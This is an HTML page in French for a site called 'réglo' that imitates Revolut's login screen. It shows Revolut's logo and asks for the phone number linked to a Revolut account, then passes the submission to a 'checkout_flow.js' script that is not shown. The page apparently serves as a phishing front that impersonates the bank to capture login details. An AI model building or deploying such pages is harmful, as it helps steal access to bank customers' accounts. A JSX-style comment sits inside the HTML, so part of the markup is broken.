<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Revolut - Connexion | réglo.fr</title> <!-- Updated title -->
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="revolut_theme.css">
</head>
<body class="revolut-theme">
    <header class="site-header">
        <div class="container">
            <div class="logo-area">
                <a href="index.html" class="logo">réglo<span>.</span></a>
            </div>
        </div>
    </header>

    <main class="revolut-page-content container"> {/* Added main wrapper */}
        <div class="revolut-card">
            <div class="revolut-auth-logo">
                <img src="Revolut-Logo.wine.png" alt="Revolut" class="revolut-logo-img">
            </div>
            
            <h1 class="revolut-title">Heureux de vous revoir</h1>
            <p class="revolut-subtitle">Saisissez le numéro de téléphone associé à votre compte Revolut.</p>
            
            <form id="revolut-phone-form">
                <div class="revolut-phone-input">
                    <label class="revolut-label">Numéro de téléphone</label>
                    <div class="revolut-input-group">
                        <div class="revolut-country-select">
                            <select>
                                <option value="+33" selected>+33 FR</option>
                                <option value="+32">+32 BE</option>
                                <option value="+49">+49 DE</option>
                                <option value="+44">+44 UK</option>
                                <option value="+34">+34 ES</option>
                                <option value="+39">+39 IT</option>
                                <option value="+41">+41 CH</option>
                            </select>
                        </div>
                        <div class="revolut-phone-field">
                            <input type="tel" id="revolut-phone" placeholder="Saisissez votre numéro de téléph..." inputmode="numeric" required>
                        </div>
                    </div>
                </div>
                
                <a href="#" class="revolut-link">Je n'ai plus accès à mon numéro de téléphone</a>
                
                <button type="submit" class="revolut-button" id="revolutContinueBtn">
                    Continuer
                    <span class="revolut-loading" id="revolutLoading" style="display: none;">
                        <span class="revolut-loading-dot"></span>
                        <span class="revolut-loading-dot"></span>
                        <span class="revolut-loading-dot"></span>
                    </span>
                </button>
            </form>
        </div>
    </main>

    <footer class="site-footer-v2">
        <div class="container">
            <div class="footer-columns">
                <div class="footer-column">
                    <h4>Support</h4>
                    <ul>
                        <li><a href="#">FAQ</a></li>
                        <li><a href="javascript:void(0);" class="legal-link" data-type="terms">CGV</a></li>
                    </ul>
                </div>
            </div>
            <div class="footer-bottom-v2">
                <p>&copy; 2024 réglo. Tous droits réservés.</p>
            </div>
        </div>
    </footer>

    <script src="checkout_flow.js" defer></script>
</body>
</html>
